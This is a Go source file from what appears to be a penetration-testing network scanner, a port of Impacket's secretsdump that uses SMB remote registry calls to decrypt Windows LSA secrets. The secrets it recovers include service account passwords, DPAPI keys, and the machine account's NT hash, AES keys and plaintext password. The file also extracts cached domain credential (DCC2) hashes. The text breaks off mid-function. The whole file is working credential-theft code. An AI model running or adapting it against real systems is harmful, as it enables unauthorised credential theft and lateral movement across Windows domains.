package smb

import (
	"bytes"
	"context"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"fmt"
	"strings"

	smbfern "github.com/Method-Security/networkscan/generated/go/pentest/smb"
	"github.com/jfjallid/go-smb/dcerpc/msrrp"
	gosmb "github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/encoder"
	svc1log "github.com/palantir/witchcraft-go-logging/wlog/svclog/svc1log"
	"golang.org/x/crypto/md4"
)

// LSA secret data structures (from go-secdump)
type lsaSecret struct {
	Version       uint32
	EncKeyID      string // 16 bytes
	EncAlgorithm  uint32
	Flags         uint32
	EncryptedData []byte
}

func (ls *lsaSecret) unmarshal(data []byte) error {
	if len(data) < 28 {
		return fmt.Errorf("data too short for lsaSecret header: %d bytes", len(data))
	}

	ls.Version = binary.LittleEndian.Uint32(data[:4])
	ls.EncKeyID = string(data[4:20])
	ls.EncAlgorithm = binary.LittleEndian.Uint32(data[20:24])
	ls.Flags = binary.LittleEndian.Uint32(data[24:28])
	ls.EncryptedData = data[28:]
	return nil
}

type lsaSecretBlob struct {
	Length  uint32
	Unknown [12]byte
	Secret  []byte
}

func (lsb *lsaSecretBlob) unmarshal(data []byte) {
	if len(data) < 16 {
		return
	}
	lsb.Length = binary.LittleEndian.Uint32(data[:4])
	copy(lsb.Unknown[:], data[4:16])

	// Match go-secdump: trust the Length but add basic bounds check to prevent panic
	if 16+int(lsb.Length) <= len(data) {
		lsb.Secret = data[16 : 16+lsb.Length]
	} else {
		// If Length is corrupted, take all remaining data (like go-secdump would in practice)
		lsb.Secret = data[16:]
	}
}

type dpapiSystem struct {
	Version    uint32
	MachineKey [20]byte
	UserKey    [20]byte
}

func (ds *dpapiSystem) unmarshal(data []byte) error {
	if len(data) < 44 {
		return fmt.Errorf("dpapiSystem data too short: %d bytes", len(data))
	}
	ds.Version = binary.LittleEndian.Uint32(data[:4])
	copy(ds.MachineKey[:], data[4:24])
	copy(ds.UserKey[:], data[24:44])
	return nil
}

type nlRecord struct {
	UserLength               uint16
	DomainNameLength         uint16
	EffectiveNameLength      uint16
	FullNameLength           uint16
	LogonScriptName          uint16
	ProfilePathLength        uint16
	HomeDirectoryLength      uint16
	HomeDirectoryDriveLength uint16
	UserID                   uint32
	PrimaryGroupID           uint32
	GroupCount               uint32
	logonDomainNameLength    uint16
	Unk0                     uint16
	LastWrite                uint64
	Revision                 uint32
	SidCount                 uint32
	Flags                    uint32
	Unk1                     uint32
	LogonPackageLength       uint32
	DNSDomainNameLength      uint16
	UPN                      uint16
	IV                       [16]byte
	CH                       [16]byte
	EncryptedData            []byte
}

func (nr *nlRecord) unmarshal(data []byte) (err error) {
	if len(data) < 96 {
		err = fmt.Errorf("Not enough data to unmarshal an NL_RECORD")
		return
	}

	nr.UserLength = binary.LittleEndian.Uint16(data[:2])
	nr.DomainNameLength = binary.LittleEndian.Uint16(data[2:4])
	nr.EffectiveNameLength = binary.LittleEndian.Uint16(data[4:6])
	nr.FullNameLength = binary.LittleEndian.Uint16(data[6:8])
	nr.LogonScriptName = binary.LittleEndian.Uint16(data[8:10])
	nr.ProfilePathLength = binary.LittleEndian.Uint16(data[10:12])
	nr.HomeDirectoryLength = binary.LittleEndian.Uint16(data[12:14])
	nr.HomeDirectoryDriveLength = binary.LittleEndian.Uint16(data[14:16])
	nr.UserID = binary.LittleEndian.Uint32(data[16:20])
	nr.PrimaryGroupID = binary.LittleEndian.Uint32(data[20:24])
	nr.GroupCount = binary.LittleEndian.Uint32(data[24:28])
	nr.logonDomainNameLength = binary.LittleEndian.Uint16(data[28:30])
	nr.Unk0 = binary.LittleEndian.Uint16(data[30:32])
	nr.LastWrite = binary.LittleEndian.Uint64(data[32:40])
	nr.Revision = binary.LittleEndian.Uint32(data[40:44])
	nr.SidCount = binary.LittleEndian.Uint32(data[44:48])
	nr.Flags = binary.LittleEndian.Uint32(data[48:52])
	nr.Unk1 = binary.LittleEndian.Uint32(data[52:56])
	nr.LogonPackageLength = binary.LittleEndian.Uint32(data[56:60])
	nr.DNSDomainNameLength = binary.LittleEndian.Uint16(data[60:62])
	nr.UPN = binary.LittleEndian.Uint16(data[62:64])
	copy(nr.IV[:], data[64:80])
	copy(nr.CH[:], data[80:96])
	nr.EncryptedData = data[96:]
	return
}

func padDWORD(data uint64) uint64 {
	if data&0x3 == 0 {
		return data
	}
	return data + (4 - (data & 0x3))
}

type PrintableLSASecret struct {
	secretType  string
	secrets     []string
	extraSecret string
}

// LSASecret represents an LSA secret extracted from the registry
type LSASecret struct {
	Name        string
	Secret      string
	Description string
}

// CachedCredential represents a cached domain credential (DCC2)
type CachedCredential struct {
	Domain    string
	Username  string
	Hash      string
	LastLogin string
}

func decryptLSAKey(rpccon *msrrp.RPCCon, base []byte, data []byte) (result []byte, err error) {
	_, err = GetBootKey(rpccon, base)
	if err != nil {
		return
	}
	var plaintext []byte
	if VistaStyle {
		// data contains a list of LSA Keys, so could be more than 1 in the list.
		lsaSecret := &lsaSecret{}
		if err := lsaSecret.unmarshal(data); err != nil {
			return nil, fmt.Errorf("failed to unmarshal LSA secret: %v", err)
		}
		encryptedData := lsaSecret.EncryptedData
		if len(encryptedData) < 32 {
			return nil, fmt.Errorf("LSA secret encrypted data too short: %d bytes", len(encryptedData))
		}
		tmpkey := SHA256(BootKey, encryptedData[:32], 0)
		plaintext, err2 := DecryptAES(tmpkey, encryptedData[32:], nil)
		if err2 != nil {
			err = err2
			return
		}
		lsaSecretBlob := &lsaSecretBlob{}
		lsaSecretBlob.unmarshal(plaintext)
		if len(lsaSecretBlob.Secret) < 84 {
			return nil, fmt.Errorf("LSA secret too short for key extraction: %d bytes", len(lsaSecretBlob.Secret))
		}
		result = lsaSecretBlob.Secret[52:84]
	} else {
		// Seems to be for Windows XP
		// Untested code
		h := md5.New()
		h.Write(BootKey)
		for i := 0; i < 1000; i++ {
			h.Write(data[60:76])
		}
		tmpkey := h.Sum(nil)
		c1, err2 := rc4.NewCipher(tmpkey[:])
		if err2 != nil {
			err = err2
			return
		}
		plaintext = make([]byte, 48)
		c1.XORKeyStream(plaintext, data[12:60])
		result = plaintext[0x10:0x20]
	}
	return
}

func GetLSASecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []byte, err error) {
	if len(LSAKey) > 0 {
		return
	}
	VistaStyle = true
	var data []byte
	var hSubKey []byte
	if modifyDacl {
		hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolEKList`)
	} else {
		hSubKey, err = rpccon.OpenSubKeyExt(base, `Security\Policy\PolEKList`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		if strings.Contains(err.Error(), "ERROR_FILE_NOT_FOUND") {
			VistaStyle = false
		} else {
			return
		}
	}
	if VistaStyle {
		data, _, _, err = rpccon.QueryValue2(hSubKey, "")
		if err != nil {
			_ = rpccon.CloseKeyHandle(hSubKey)
			return
		}
		_ = rpccon.CloseKeyHandle(hSubKey)
	} else {
		if modifyDacl {
			hSubKey, err = rpccon.OpenSubKey(base, `Security\Policy\PolSecretEncryptionKey`)
		} else {
			hSubKey, err = rpccon.OpenSubKeyExt(base, `Security\Policy\PolSecretEncryptionKey`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
		}
		if err != nil {
			if strings.Contains(err.Error(), "ERROR_FILE_NOT_FOUND") {
				// Could not find LSA Secret key
			} else {
				return
			}
			return
		}
		data, _, _, err = rpccon.QueryValue2(hSubKey, "")
		if err != nil {
			_ = rpccon.CloseKeyHandle(hSubKey)
			return
		}
		_ = rpccon.CloseKeyHandle(hSubKey)
	}
	if len(data) == 0 {
		err = fmt.Errorf("Failed to get LSA key")
		return
	}

	result, err = decryptLSAKey(rpccon, base, data)
	if err != nil {
		return
	}
	LSAKey = make([]byte, 32)
	copy(LSAKey, result)
	return
}

func getServiceUser(rpccon *msrrp.RPCCon, base []byte, name string) (result string, err error) {
	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\`+name)
	if err != nil {
		return
	}
	defer func() { _ = rpccon.CloseKeyHandle(hSubKey) }()
	return rpccon.QueryValueString(hSubKey, "ObjectName")
}

func GetHostnameAndDomain(rpccon *msrrp.RPCCon, base []byte) (hostname, domain string, err error) {
	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters`)
	if err != nil {
		return
	}
	defer func(h []byte) {
		_ = rpccon.CloseKeyHandle(h)
	}(hSubKey)

	domain, err = rpccon.QueryValueString(hSubKey, "Domain")
	if err != nil {
		return
	}

	hostname, err = rpccon.QueryValueString(hSubKey, "Hostname")
	if err != nil {
		return
	}
	return
}

// GetNetBIOSDomain retrieves the NetBIOS domain name from registry
func GetNetBIOSDomain(rpccon *msrrp.RPCCon, base []byte) (string, error) {
	// Try to get NetBIOS domain name from the ComputerName registry key
	hSubKey, err := rpccon.OpenSubKey(base, `SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName`)
	if err == nil {
		defer func(h []byte) {
			_ = rpccon.CloseKeyHandle(h)
		}(hSubKey)

		_, err := rpccon.QueryValueString(hSubKey, "ComputerName")
		if err == nil {
			// Try to get the domain from LSA Policy
			hLsaKey, err := rpccon.OpenSubKey(base, `SECURITY\Policy\PolAcDmN`)
			if err == nil {
				defer func(h []byte) {
					_ = rpccon.CloseKeyHandle(h)
				}(hLsaKey)

				// This contains the NetBIOS domain name, but it's encrypted
				// For now, fall back to the DNS domain extraction
			}
		}
	}

	// Fallback: try to get from DNS domain and extract NetBIOS name
	_, domain, err := GetHostnameAndDomain(rpccon, base)
	if err != nil {
		return "WORKGROUP", nil
	}

	// Extract NetBIOS name from FQDN (e.g., "corp.auric-dynamics.com" -> "CORP")
	netbiosDomain := strings.Split(domain, ".")[0]
	return strings.ToUpper(netbiosDomain), nil
}

func parseSecret(rpccon *msrrp.RPCCon, base []byte, name string, secretItem []byte) (result *PrintableLSASecret, err error) {

	if len(secretItem) == 0 {
		return
	}
	if bytes.Compare(secretItem[:2], []byte{0, 0}) == 0 {
		return
	}
	secret := ""
	extrasecret := ""
	upperName := strings.ToUpper(name)
	result = &PrintableLSASecret{}
	result.secretType = "[*] " + name
	if strings.HasPrefix(upperName, "_SC_") {
		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		if err2 != nil {
			err = err2
			return
		}
		//Get service account name
		svcUser, err := getServiceUser(rpccon, base, name[4:]) // Skip initial _SC_ of the name
		if err != nil {
			svcUser = "(unknown user)"
		} else {
			if strings.HasPrefix(svcUser, ".\\") {
				svcUser = svcUser[2:]
			}
		}
		secret = fmt.Sprintf("%s: %s", svcUser, secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "ASPNET_WP_PASSWORD") {
		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		if err2 != nil {
			err = err2
			return
		}
		secret = fmt.Sprintf("ASPNET: %s", secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "DPAPI_SYSTEM") {
		dpapi := &dpapiSystem{}
		if err2 := dpapi.unmarshal(secretItem); err2 != nil {
			err = err2
			return
		}
		secret = fmt.Sprintf("dpapi_machinekey: 0x%x", dpapi.MachineKey)
		secret2 := fmt.Sprintf("dpapi_userkey: 0x%x", dpapi.UserKey)
		result.secrets = append(result.secrets, secret)
		result.secrets = append(result.secrets, secret2)
	} else if strings.HasPrefix(upperName, "$MACHINE.ACC") {
		h := md4.New()
		h.Write(secretItem)
		// Get hostname and format as HOSTNAME$ instead of $MACHINE.ACC
		hostname, domain, err := GetHostnameAndDomain(rpccon, base)
		var printname string
		if err != nil || hostname == "" {
			// Fallback to original format if hostname retrieval fails
			printname = "$MACHINE.ACC"
		} else {
			printname = strings.ToUpper(hostname) + "$"
		}
		secret = fmt.Sprintf("%s (NT Hash): %x", printname, h.Sum(nil))
		result.secrets = append(result.secrets, secret)
		// Calculate AES128 and AES256 keys from plaintext passwords
		if err != nil {
			// Skip calculation of AES Keys if request failed or if domain is empty
		} else if domain != "" {
			aes128Key, aes256Key, err := CalcMachineAESKeys(hostname, domain, secretItem)
			if err != nil {
				// Skip if calculation fails
			} else {
				result.secrets = append(result.secrets, fmt.Sprintf("%s:AES_128_key:%x", printname, aes128Key))
				result.secrets = append(result.secrets, fmt.Sprintf("%s:AES_256_key:%x", printname, aes256Key))
			}
		}
		// Always print plaintext anyway since this may be needed for some popular usecases
		extrasecret = fmt.Sprintf("%s:plain_password_hex:%x", printname, secretItem)
		result.extraSecret = extrasecret
	} else if strings.HasPrefix(upperName, "NL$KM") {
		secret = fmt.Sprintf("NL$KM: 0x%x", secretItem[:16])
		result.secrets = append(result.secrets, secret)
	} else if strings.HasPrefix(upperName, "CACHEDDEFAULTPASSWORD") {
		secretDecoded, err2 := encoder.FromUnicodeString(secretItem)
		if err2 != nil {
			err = err2
			return
		}
		username := ""
		if username == "" {
			username = "(Unknown user)"
		}

		// Get default login name
		secret = fmt.Sprintf("%s: %s", username, secretDecoded)
		result.secrets = append(result.secrets, secret)
	} else {
		// Handle Security questions?
	}
	return
}

// GetLSASecrets extracts LSA secrets from the Windows registry.
// Code inspired/partially stolen from Impacket's Secretsdump
func GetLSASecrets(rpccon *msrrp.RPCCon, base []byte, history, modifyDacl bool) (secrets []PrintableLSASecret, err error) {
	secretsPath := `SECURITY\Policy\Secrets`
	var keys []string
	if modifyDacl {
		keys, err = rpccon.GetSubKeyNames(base, secretsPath)
	} else {
		keys, err = rpccon.GetSubKeyNamesExt(base, secretsPath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		return nil, err
	}

	if len(keys) == 0 {
		return
	}

	// GetLSASecretKey
	_, err = GetLSASecretKey(rpccon, base, modifyDacl)
	if err != nil {
		return
	}

	for _, key := range keys {
		if key == "NL$Control" { // Skip
			continue
		}
		/* The SECURITY\Policy\Secrets each contain a set of values where two
		   of them are OldVal and CurrVal. OldVal seems to be the previously
		   stored secret before it was updated. So it can be included if a history
		   is desired. Otherwise CurrVal contains the current value of the secret.*/
		valueTypeList := []string{"CurrVal"}
		if history {
			valueTypeList = append(valueTypeList, "OldVal")
		}
		var secret []byte
		for _, valueType := range valueTypeList {
			var hSubKey []byte
			if modifyDacl {
				hSubKey, err = rpccon.OpenSubKey(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType))
			} else {
				hSubKey, err = rpccon.OpenSubKeyExt(base, fmt.Sprintf("%s\\%s\\%s", secretsPath, key, valueType), msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
			}
			if err != nil {
				return nil, err
			}

			value, _, _, err := rpccon.QueryValue2(hSubKey, "")
			if err != nil {
				_ = rpccon.CloseKeyHandle(hSubKey)
				continue
			}
			_ = rpccon.CloseKeyHandle(hSubKey)

			if (len(value) != 0) && (value[0] == 0x0) {
				if VistaStyle {
					record := &lsaSecret{}
					if err := record.unmarshal(value); err != nil {
						continue // Skip this secret if we can't unmarshal it
					}
					if len(record.EncryptedData) < 32 {
						continue // Skip if encrypted data is too short
					}
					tmpKey := SHA256(LSAKey, record.EncryptedData[:32], 0)
					plainText, err := DecryptAES(tmpKey, record.EncryptedData[32:], nil)
					if err != nil {
						continue
					}
					// Parse as lsa_secret_blob like go-secdump does
					record2 := &lsaSecretBlob{}
					record2.unmarshal(plainText)
					secret = record2.Secret
				} else {
					continue
				}
				if valueType == "OldVal" {
					key += "_history"
				}
				ps, err := parseSecret(rpccon, base, key, secret)
				if err != nil {
					continue
				} else if ps == nil {
					continue
				}
				secrets = append(secrets, *ps)
			}
		}
	}
	return
}

func GetCachedHashes(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []string, err error) {
	baseKeyPath := `Security\Cache`
	var names []string
	var hSubKey []byte
	if modifyDacl {
		hSubKey, err = rpccon.OpenSubKey(base, baseKeyPath)
	} else {
		hSubKey, err = rpccon.OpenSubKeyExt(base, baseKeyPath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		return
	}
	defer func() { _ = rpccon.CloseKeyHandle(hSubKey) }()

	valueNames, err := rpccon.GetValueNames(hSubKey)
	if err != nil {
		return
	}

	if len(valueNames) == 0 {
		// No cache entries
		return
	}
	foundIterCount := false
	for _, name := range valueNames {
		if name == "NL$Control" {
			continue
		}
		if name == "NL$IterationCount" {
			foundIterCount = true
			continue
		}
		names = append(names, name)
	}
	iterationCount := 10240
	if foundIterCount {
		var tmpIterCount uint32
		data, _, _, err := rpccon.QueryValue2(hSubKey, `NL$IterationCount`)
		if err != nil {
			return nil, err
		}
		tmpIterCount = binary.LittleEndian.Uint32(data)
		if tmpIterCount > 10240 {
			iterationCount = int(tmpIterCount & 0xfffffc00)
		} else {
			iterationCount = int(tmpIterCount * 1024)
		}
	}

	_, err = GetLSASecretKey(rpccon, base, modifyDacl)
	if err != nil {
		return
	}
	_, err = getNLKMSecretKey(rpccon, base, modifyDacl)
	if err != nil {
		return
	}
	for _, name := range names {
		data, _, _, err := rpccon.QueryValue2(hSubKey, name)
		if err != nil {
			return nil, err
		}

		// NL_RECORD
		nlRecord := &nlRecord{}
		err = nlRecord.unmarshal(data)
		if err != nil {
			continue
		}
		nilIV := make([]byte, 16)
		var plaintext []byte
		var answer string
		if bytes.Compare(nlRecord.IV[:], nilIV) != 0 {
			if (nlRecord.Flags & 1) == 1 {
				// Encrypted
				if VistaStyle {
					plaintext, err = DecryptAES(NLKMKey[16:32], nlRecord.EncryptedData, nlRecord.IV[:])
					if err != nil {
						continue
					}
				} else {
					continue
				}
			} else {
				continue
			}
			encHash := plaintext[:0x10]
			plaintext = plaintext[0x48:]
			userName, err := encoder.FromUnicodeString(plaintext[:nlRecord.UserLength])
			if err != nil {
				continue
			}
			plaintext = plaintext[int(padDWORD(uint64(nlRecord.UserLength)))+int(padDWORD(uint64(nlRecord.DomainNameLength))):]
			domainLong, err := encoder.FromUnicodeString(plaintext[:int(padDWORD(uint64(nlRecord.DNSDomainNameLength)))])
			if err != nil {
				continue
			}

			if VistaStyle {
				answer = fmt.Sprintf("%s/%s:$DCC2$%d#%s#%x", domainLong, userName, iterationCount, userName, encHash)
			} else {
				answer = fmt.Sprintf("%s/%s:%x:%s", domainLong, userName, encHash, userName)
			}
			result = append(result, answer)
		} else {
			continue
		}
	}
	return
}

func getNLKMSecretKey(rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) (result []byte, err error) {
	if len(NLKMKey) > 0 {
		return
	}

	var hSubKey []byte
	if modifyDacl {
		hSubKey, err = rpccon.OpenSubKey(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`)
	} else {
		hSubKey, err = rpccon.OpenSubKeyExt(base, `SECURITY\Policy\Secrets\NL$KM\CurrVal`, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		return
	}
	data, _, _, err := rpccon.QueryValue2(hSubKey, "")
	if err != nil {
		_ = rpccon.CloseKeyHandle(hSubKey)
		return
	}
	_ = rpccon.CloseKeyHandle(hSubKey)

	if VistaStyle {
		lsaSecret := &lsaSecret{}
		if err := lsaSecret.unmarshal(data); err != nil {
			return nil, fmt.Errorf("failed to unmarshal LSA secret: %v", err)
		}
		if len(lsaSecret.EncryptedData) < 32 {
			return nil, fmt.Errorf("LSA secret encrypted data too short: %d bytes", len(lsaSecret.EncryptedData))
		}
		tmpkey := SHA256(LSAKey, lsaSecret.EncryptedData[:32], 0)
		var err2 error
		result, err2 = DecryptAES(tmpkey, lsaSecret.EncryptedData[32:], nil)
		if err2 != nil {
			err = err2
			return
		}
	} else {
		return
	}

	NLKMKey = make([]byte, 32)
	copy(NLKMKey, result)

	return
}

// GetCachedCredentials extracts cached domain credentials (DCC2) from the SECURITY\Cache registry
func GetCachedCredentials(ctx context.Context, rpccon *msrrp.RPCCon, base []byte, modifyDacl bool) ([]CachedCredential, error) {
	var err error

	cachePath := `SECURITY\Cache`
	var keys []string

	if modifyDacl {
		keys, err = rpccon.GetSubKeyNames(base, cachePath)
	} else {
		keys, err = rpccon.GetSubKeyNamesExt(base, cachePath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
	}
	if err != nil {
		return nil, fmt.Errorf("failed to enumerate cache keys: %v", err)
	}

	var cachedCreds []CachedCredential

	// If no subkeys found, try to check if the Cache key itself has values
	if len(keys) == 0 {
		var hCacheKey []byte
		if modifyDacl {
			hCacheKey, err = rpccon.OpenSubKey(base, cachePath)
		} else {
			hCacheKey, err = rpccon.OpenSubKeyExt(base, cachePath, msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
		}
		if err != nil {
			return nil, fmt.Errorf("failed to open cache key: %v", err)
		}
		defer func() { _ = rpccon.CloseKeyHandle(hCacheKey) }()

		// Try to enumerate values in the Cache key
		values, err := rpccon.GetValueNames(hCacheKey)
		if err != nil {
			return cachedCreds, nil
		}

		// Process each cache value
		for _, valueName := range values {
			if !strings.HasPrefix(valueName, "NL$") || valueName == "NL$Control" {
				continue
			}

			valueData, _, _, err := rpccon.QueryValue2(hCacheKey, valueName)
			if err != nil {
				continue
			}

			if len(valueData) == 0 {
				continue
			}

			// Parse cached credential entry
			cachedCred, err := parseCachedCredential(valueData)
			if err != nil {
				continue
			}

			if cachedCred != nil {
				cachedCreds = append(cachedCreds, *cachedCred)
			}
		}

		return cachedCreds, nil
	}

	// Get the NL$KM key for decryption
	_, err = GetLSASecretKey(rpccon, base, modifyDacl)
	if err != nil {
		return nil, fmt.Errorf("failed to get LSA key for cache decryption: %v", err)
	}

	for _, key := range keys {
		if !strings.HasPrefix(key, "NL$") || key == "NL$Control" {
			continue
		}

		var hSubKey []byte
		if modifyDacl {
			hSubKey, err = rpccon.OpenSubKey(base, fmt.Sprintf("%s\\%s", cachePath, key))
		} else {
			hSubKey, err = rpccon.OpenSubKeyExt(base, fmt.Sprintf("%s\\%s", cachePath, key), msrrp.RegOptionBackupRestore, msrrp.PermMaximumAllowed)
		}
		if err != nil {
			continue
		}

		value, _, _, err := rpccon.QueryValue2(hSubKey, "")
		if err != nil {
			_ = rpccon.CloseKeyHandle(hSubKey)
			continue
		}
		_ = rpccon.CloseKeyHandle(hSubKey)

		if len(value) == 0 {
			continue
		}

		// Parse cached credential entry
		cachedCred, err := parseCachedCredential(value)
		if err != nil {
			continue
		}

		if cachedCred != nil {
			cachedCreds = append(cachedCreds, *cachedCred)
		}
	}

	return cachedCreds, nil
}

// parseCachedCredential parses a cached credential entry from registry data
func parseCachedCredential(data []byte) (*CachedCredential, error) {
	if len(data) < 64 {
		return nil, fmt.Errorf("cached credential data too short: %d bytes", len(data))
	}

	// Check if this is an empty/null entry (all zeros)
	isEmpty := true
	for _, b := range data[:32] {
		if b != 0 {
			isEmpty = false
			break
		}
	}
	if isEmpty {
		return nil, fmt.Errorf("empty cached credential entry")
	}

	// Windows CACHE_ENTRY structure parsing
	// The structure contains:
	// - Header with offsets and lengths
	// - DCC2 hash
	// - Unicode strings for username and domain

	// Windows CACHE_ENTRY structure:
	// Offset 0x08: Username length (WORD)
	// Offset 0x0A: Domain length (WORD)
	// Offset 0x0C: Effective name length (WORD)
	// Offset 0x48: Username offset from start of user data section
	// Offset 0x4A: Domain offset from start of user data section
	// User data starts at offset 0x60 (96 bytes)

	usernameLen := binary.LittleEndian.Uint16(data[8:10])
	domainLen := binary.LittleEndian.Uint16(data[10:12])
	usernameRelOffset := binary.LittleEndian.Uint16(data[72:74]) // 0x48
	domainRelOffset := binary.LittleEndian.Uint16(data[74:76])   // 0x4A

	// Calculate absolute offsets (relative to start of user data at offset 96)
	userDataStart := 96
	usernameOffset := userDataStart + int(usernameRelOffset)
	domainOffset := userDataStart + int(domainRelOffset)

	// Extract username
	username := ""
	if usernameLen > 0 && usernameOffset >= 0 && usernameOffset < len(data) && usernameOffset+int(usernameLen) <= len(data) {
		usernameBytes := data[usernameOffset : usernameOffset+int(usernameLen)]
		// Convert Unicode (UTF-16LE) to string
		username = decodeUTF16LE(usernameBytes)
	}

	// Extract domain
	domain := ""
	if domainLen > 0 && domainOffset >= 0 && domainOffset < len(data) && domainOffset+int(domainLen) <= len(data) {
		domainBytes := data[domainOffset : domainOffset+int(domainLen)]
		// Convert Unicode (UTF-16LE) to string
		domain = decodeUTF16LE(domainBytes)
	}

	if username == "" {
		return nil, fmt.Errorf("could not extract username from cached credential")
	}

	if domain == "" {
		domain = "UNKNOWN"
	}

	// Extract DCC2 hash (typically at offset 64 for 16 bytes)
	hashOffset := 64
	if len(data) < hashOffset+16 {
		return nil, fmt.Errorf("cached credential data too short for hash extraction")
	}

	hashBytes := data[hashOffset : hashOffset+16]
	hash := fmt.Sprintf("$DCC2$10240#%s#%x", username, hashBytes)

	// Extract timestamp if available (at offset 24, 8 bytes)
	lastLogin := "unknown"
	if len(data) >= 32 {
		timestamp := binary.LittleEndian.Uint64(data[24:32])
		if timestamp != 0 {
			// Convert Windows FILETIME to readable format
			lastLogin = fmt.Sprintf("timestamp: %d", timestamp)
		}
	}

	return &CachedCredential{
		Domain:    domain,
		Username:  username,
		Hash:      hash,
		LastLogin: lastLogin,
	}, nil
}

// decodeUTF16LE converts UTF-16LE bytes to string
func decodeUTF16LE(data []byte) string {
	if len(data)%2 != 0 {
		return ""
	}

	var result strings.Builder
	for i := 0; i < len(data); i += 2 {
		if i+1 >= len(data) {
			break
		}
		char := binary.LittleEndian.Uint16(data[i : i+2])
		if char == 0 {
			break // Null terminator
		}
		result.WriteRune(rune(char))
	}
	return result.String()
}

// DumpLSASecrets performs LSA secrets dumping from registry
func DumpLSASecrets(ctx context.Context, rpccon *msrrp.RPCCon, hKey []byte, modifyDacl bool) ([]*smbfern.LsaSecret, []string, error) {
	log := svc1log.FromContext(ctx)
	var results []*smbfern.LsaSecret
	var errors []string

	lsaSecrets, err := GetLSASecrets(rpccon, hKey, false, modifyDacl)
	if err != nil {
		errors = append(errors, fmt.Sprintf("Failed to get LSA secrets: %v", err))
		return results, errors, err
	}

	log.Info("LSA secrets extraction completed",
		svc1log.SafeParam("secretCount", len(lsaSecrets)))

	// Get cached credentials using go-secdump method
	cachedHashes, err := GetCachedHashes(rpccon, hKey, modifyDacl)
	if err != nil {
		// Don't fail completely if cached hashes fail
		log.Info("Failed to get cached hashes", svc1log.SafeParam("error", err))
	}

	for _, secret := range lsaSecrets {
		var entries []*smbfern.LsaSecretEntry

		// Convert secrets to key-value entries
		for _, secretStr := range secret.secrets {
			// Handle different formats of secrets
			if strings.Contains(secretStr, ":") {
				// Try different separators - first ": " (space after colon)
				if strings.Contains(secretStr, ": ") {
					parts := strings.SplitN(secretStr, ": ", 2)
					entries = append(entries, &smbfern.LsaSecretEntry{
						Key:   parts[0],
						Value: parts[1],
					})
				} else {
					// Handle format like "$MACHINE.ACC:AES_128_key:value"
					// Split into maximum 3 parts: prefix, key_type, value
					parts := strings.SplitN(secretStr, ":", 3)
					if len(parts) == 3 {
						// Format: $MACHINE.ACC:AES_128_key:value
						key := parts[0] + ":" + parts[1] // e.g., "$MACHINE.ACC:AES_128_key"
						value := parts[2]
						entries = append(entries, &smbfern.LsaSecretEntry{
							Key:   key,
							Value: value,
						})
					} else if len(parts) == 2 {
						// Format: key:value
						entries = append(entries, &smbfern.LsaSecretEntry{
							Key:   parts[0],
							Value: parts[1],
						})
					} else {
						entries = append(entries, &smbfern.LsaSecretEntry{
							Key:   "",
							Value: secretStr,
						})
					}
				}
			} else {
				// If no colon, use the whole string as value with empty key
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   "",
					Value: secretStr,
				})
			}
		}

		// Add extra secret as separate entry if present
		if secret.extraSecret != "" {
			// Handle format like "$MACHINE.ACC:plain_password_hex:value"
			parts := strings.SplitN(secret.extraSecret, ":", 3)
			if len(parts) == 3 {
				// Format: $MACHINE.ACC:plain_password_hex:value
				key := parts[0] + ":" + parts[1] // e.g., "$MACHINE.ACC:plain_password_hex"
				value := parts[2]
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   key,
					Value: value,
				})
			} else if len(parts) == 2 {
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   parts[0],
					Value: parts[1],
				})
			} else {
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   "",
					Value: secret.extraSecret,
				})
			}
		}

		// Only add secrets that have entries
		if len(entries) > 0 {
			lsaSecret := &smbfern.LsaSecret{
				Name:    secret.secretType,
				Entries: entries,
			}
			results = append(results, lsaSecret)
		}

		log.Info("Extracted LSA secret",
			svc1log.SafeParam("secretName", secret.secretType),
			svc1log.SafeParam("entryCount", len(entries)))
	}

	// Add cached credentials to results (consolidated)
	if len(cachedHashes) > 0 {
		var entries []*smbfern.LsaSecretEntry
		for _, cachedHash := range cachedHashes {
			// Clean null characters from the cached hash
			cleanHash := strings.ReplaceAll(cachedHash, "\u0000", "")

			// Split on ":" to get domain/user and DCC2 hash parts
			if strings.Contains(cleanHash, ":") {
				parts := strings.SplitN(cleanHash, ":", 2)
				if len(parts) == 2 {
					key := parts[0]   // e.g., "CORP.AURIC-DYNAMICS.COM/jbond"
					value := parts[1] // e.g., "$DCC2$10240#jbond#d337a6458d552038ef22fcdf7b38f635"
					entries = append(entries, &smbfern.LsaSecretEntry{
						Key:   key,
						Value: value,
					})
				} else {
					// Fallback if splitting fails
					entries = append(entries, &smbfern.LsaSecretEntry{
						Key:   "Cached hash",
						Value: cleanHash,
					})
				}
			} else {
				// No colon found, use as-is with generic key
				entries = append(entries, &smbfern.LsaSecretEntry{
					Key:   "Cached hash",
					Value: cleanHash,
				})
			}
		}

		if len(entries) > 0 {
			lsaSecret := &smbfern.LsaSecret{
